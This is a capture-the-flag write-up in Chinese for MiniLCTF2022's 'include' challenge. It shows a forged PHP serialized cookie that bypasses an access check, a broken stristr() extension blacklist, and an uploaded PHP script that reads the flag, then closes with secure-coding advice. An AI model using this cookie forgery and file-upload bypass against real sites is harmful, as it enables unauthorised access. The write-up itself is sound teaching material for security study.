# MiniLCTF2022 include Writeup

## 题目简述

应用提供 PHP 文件上传，但权限由客户端 Cookie 决定：服务端直接对 Base64 解码后的 Cookie 执行 `unserialize()`，再检查对象的 `usergroup` 是否等于 `Lteam`。上传扩展名检查又把整个黑名单数组错误地作为 `stristr()` 的第二个参数，导致 PHP 7.4 下检查失效，最终可上传并访问 PHP 脚本。

## 解题过程

服务端定义的类只有一个公开属性：

```php
class user {
    var $usergroup = 'Tourist';
}
$user = unserialize(base64_decode($_COOKIE['user']));
```

因此无需 gadget 链，直接伪造同名对象即可：

```text
O:4:"user":1:{s:9:"usergroup";s:5:"Lteam";}
```

将其 Base64 编码后替换 `user` Cookie，便通过成员检查。扩展名过滤代码为：

```php
$deny_ext = array('ph', 'htm', 'ini', 'js', 'jtml', 'as', 'cer', 'swf', 'htaccess');
if (stristr($file_name, $deny_ext)) {
    die('hacker!');
}
```

`stristr()` 的 needle 应是字符串，不能直接传数组；错误又被 `error_reporting(0)` 隐藏，条件没有逐项检查黑名单。上传如 `read.php`：

```php
<?php echo file_get_contents('/flag'); ?>
```

服务端落盘名不是原文件名，而是：

```php
$file = 'file' . md5($_FILES['file']['name']) . '.' . pathinfo($_FILES['file']['name'])['extension'];
```

所以 `read.php` 的访问路径为 `/upload/file<md5("read.php")>.php`。请求该路径即可读取 flag。原题解中的上传包和回显截图均是可转写文本，没有视觉信息价值，故未保留。

## 方法总结

这道题串联了两类信任错误：权限对象完全由客户端提供，文件名过滤又调用了错误的 API 类型。反序列化本身不一定要走复杂 gadget；能直接改业务属性时，伪造最小对象就是最短路径。安全实现应把身份和权限放在服务端会话中，对扩展名使用严格白名单，并在 Web 根目录之外保存上传内容，避免脚本被解释执行。
